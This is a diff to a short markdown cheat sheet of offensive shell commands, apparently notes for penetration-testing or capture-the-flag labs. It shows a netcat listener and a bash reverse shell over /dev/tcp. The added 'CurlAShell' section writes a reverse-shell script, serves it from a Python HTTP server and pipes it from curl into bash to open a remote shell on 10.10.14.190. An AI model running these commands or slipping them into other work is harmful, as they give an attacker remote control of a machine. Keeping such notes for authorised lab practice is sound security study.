@@ -33,10 +33,10 @@ sudo netstat -tulnp
 open reverse shell
 
 ### Reverse shell Server
+- Kali contains a share folder with shell scrips
 ```sh
 #create a listener for shell session
 nc -nvlp 1337
-
 
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.15.71/1337 0>&1
@@ -62,3 +62,18 @@ python -m http.server 8001
 diff -y file1 file2
 -y # side by side
 ```
+
+## CurlAShell
+```bash
+#Create shell.sh file
+#!/bin/bash
+/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.190/6565 0>&1'
+#start python server
+python3 -m http.server 8003
+#start netcat listener
+nc -lvnp 6565
+#curl the shell
+curl 10.10.14.190:8003/shell.sh|bash
+```
+
+
